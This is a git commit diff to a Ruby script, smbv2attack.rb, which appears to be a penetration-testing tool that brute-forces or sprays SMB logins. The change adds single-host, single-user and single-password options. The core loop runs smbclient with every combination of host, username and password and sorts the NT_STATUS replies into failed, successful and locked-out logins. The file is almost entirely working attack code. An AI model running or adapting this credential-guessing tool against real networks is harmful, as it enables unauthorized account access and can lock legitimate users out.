0c8a8f9735b1245acbd0202f5ba9b74cd2622dc1
hatlord <rich@computar.home>
2017-03-05 20:03:31 +0000

    Added extra MESSAGE handling

--- smbv2attack.rb
+++ smbv2attack.rb
@@ -9,59 +9,89 @@ require 'trollop'
 def arguments
   opts = Trollop::options do 
     version "smbv2attack 0.1b".light_blue
-      opt :hosts, "Choose hosts to enumerate", :type => String
-      opt :user, "Username", :type => String
-      opt :users, "Username List", :type => String
-      opt :passwords, "Password list", :type => String
-      opt :domain, "Domain to attack", :type => String, :default => "WORKGROUP"
+      opt :hosts, "Choose hosts to attack", :type => String, :short => "-H"
+      opt :host, "Choose host to attack", :type => String, :short => "-h"
+      opt :user, "Username", :type => String, :short => "-u"
+      opt :users, "Username List", :type => String, :short => "-U"
+      opt :passwords, "Password list", :type => String, :short => "-P"
+      opt :password, "Password list", :type => String, :short => "-p"
+      opt :domain, "Domain to attack", :type => String, :default => "WORKGROUP", :short => "-d"
 
       if ARGV.empty?
-        puts "Need Help? Try ./smbv2attack.rb --help or -h"
+        puts "Need Help? Try ./smbv2attack.rb --help"
         exit
       end
   end
-  Trollop::die :hosts, "You must specify a list of hosts to test".red.bold if opts[:hosts].nil?
-  Trollop::die :passwords, "You must specify a password list for the attacks".red.bold if opts[:passwords].nil?
   opts
 end
 
 def check_smbclient
-  @smbclient = TTY::Which.which('smbclient.py')
-    if @smbclient.nil?
+  smbclient = TTY::Which.which('smbclient')
+    if smbclient.nil?
       install_smbclient
     end
-  @smbclient
+  smbclient
 end
 
 def install_smbclient
-  puts "SMBClient Not Installed....Downloading Impacket".light_blue.bold
-  `git clone https://github.com/CoreSecurity/impacket.git`
-  @smbclient = TTY::Which.which('smbclient.py')
+  puts "SMBClient Not Installed. Downloading Now....".light_blue.bold
+  `apt-get install smbclient`
 end
 
-def create_lists(arg)
-  @hosts = File.readlines(arg[:hosts]).map(&:chomp &&:strip)
-  @users = File.readlines(arg[:users]).map(&:chomp &&:strip)
-  @pass  = File.readlines(arg[:passwords]).map(&:chomp &&:strip)
+def create_host_list(arg)
+  if arg[:hosts]
+    @hosts = File.readlines(arg[:hosts]).map(&:chomp &&:strip)
+  else
+    @hosts = [arg[:host].chomp]
+  end
+end
+
+def create_pass_list(arg)
+  if arg[:passwords]
+    @pass = File.readlines(arg[:passwords]).map(&:chomp &&:strip)
+  else
+    @pass = [arg[:password]]
+  end
+end
+
+def create_user_list(arg)
+  if arg[:users]
+    @users = File.readlines(arg[:users]).map(&:chomp &&:strip)
+  else
+    @users = [arg[:user].chomp]
+  end
 end
 
 def command
   @log = Logger.new('debug.log')
-  cmd = TTY::Command.new(output: @log)
+  cmd  = TTY::Command.new(output: @log)
 end
 
 def smb2_attack(arg)
+  lock_count = 0 #will iterate this each time an account is locked and kill the process when we hit 3
+  puts "Attack Started #{Time.now.strftime("%H:%M:%S")}".light_blue
   @hosts.each do |host|
     @users.each do |user|
       @pass.each do |pass|
-        out, err = command.run!("@smbclient #{arg[:domain]}/#{user}:#{pass}@#{host}")
-        puts out
+        out, err = command.run!("smbclient -W #{arg[:domain]} --max-protocol=smb3 --port=445 --timeout=0.5 //#{host}/QZQ$ -U #{user}%#{pass}")
+          if out =~ /NT_STATUS_LOGON_FAILURE|NT_STATUS_ACCOUNT_DISABLED|NT_STATUS_ACCOUNT_EXPIRED/
+            print "[+] #{host} Username: #{user} Password: #{pass} LOGIN FAILED - MESSAGE = #{out.split(":")[1]}"
+          elsif out =~ /NT_STATUS_ACCESS_DENIED|NT_STATUS_BAD_NETWORK_NAME|NT_STATUS_PASSWORD_MUST_CHANGE/
+            print "[*] #{host} Username: #{user} Password: #{pass} LOGIN SUCCESS - MESSAGE = #{out.split(":")[1]}".green.bold
+          elsif out =~ /NT_STATUS_ACCOUNT_LOCKED_OUT/
+            puts "[!] #{host} Username: #{user} Password: #{pass} ACCOUNT LOCKED OUT!!!!".red.bold
+          else
+            puts "[?] #{host} Username: #{user} Password: #{pass} UNKNOWN STATUS - MESSAGE = #{out.split(":")[1]}".cyan.bold
+          end
       end
     end
   end
+  puts "Attack Finished #{Time.now.strftime("%H:%M:%S")}".light_blue
 end
 
 arg = arguments
 check_smbclient
-create_lists(arg)
+create_host_list(arg)
+create_user_list(arg)
+create_pass_list(arg)
 smb2_attack(arg)
